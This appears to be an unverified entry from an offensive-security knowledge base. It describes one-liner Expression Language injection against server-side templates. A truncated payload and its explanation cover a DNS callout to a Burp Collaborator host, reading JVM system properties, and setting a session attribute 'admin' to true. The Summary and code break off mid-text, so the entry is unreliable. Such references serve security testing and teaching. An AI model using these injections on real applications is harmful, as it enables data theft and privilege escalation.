---
id: 5fcca06e-ebdc-461f-ade6-40fd92dec7cb
name: One-Liner Expression Language Injection
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:38.993893+00:00'
updated_at: '2023-04-10T20:23:47.033233+00:00'
tags:
- '[[Expression Language EL]]'
- '[[Expression Language EL - One-Liner injections not including code execution]]'
- '[[Server Side Template Injection]]'
---

# One-Liner Expression Language Injection

## Summary

One-Liner Expression Language Injection is a technique used to inject malicious expressions into server-side templates that use Expression Language (EL). EL is a simple language used to inject dynamic content into templates. One-Liner injections are a type of EL injection that do not require code e

## Description

# Description

One-Liner Expression Language Injection is a technique used to inject malicious expressions into server-side templates that use Expression Language (EL). EL is a simple language used to inject dynamic content into templates. One-Liner injections are a type of EL injection that do not require code execution. Instead, they use existing functions and objects within the target application to perform malicious actions. This technique can be used to extract sensitive data, manipulate the application's behavior, or even execute code on the server.

 

## Requirements

1. Access to the target application's server-side templates

1. Knowledge of the target application's use of EL

 

## Defense

1. Ensure that server-side templates are properly sanitized to prevent injection attacks

1. Implement input validation to prevent malicious input from being processed

1. Monitor application logs for suspicious activity

 

## Objectives

1. Extract sensitive data from the target application

1. Manipulate the behavior of the target application

1. Execute code on the server

 

# Instructions

1. Use these commands to perform DNS Lookup, JVM System Property Lookup, and modify session attributes.

 



**Code**: [[// DNS Lookup
${"".getClass().forName("java.net.In]]



> The first command can be used to perform a DNS lookup by invoking the 'getByName' method of the 'InetAddress' class. Replace 'xxxxxxxxxxxxxx.burpcollaborator.net' with the hostname you want to lookup.

The second command can be used to lookup the value of a JVM system property by invoking the 'getProperty' method of the 'System' class. Replace 'java.class.path' with the system property you want to lookup.

The third command can be used to modify session attributes by invoking the 'setAttribute' method of the session object. Replace 'admin' with the attribute name you want to modify and 'true' with the new value.

## Tags

- [[Expression Language EL]]
- [[Expression Language EL - One-Liner injections not including code execution]]
- [[Server Side Template Injection]]


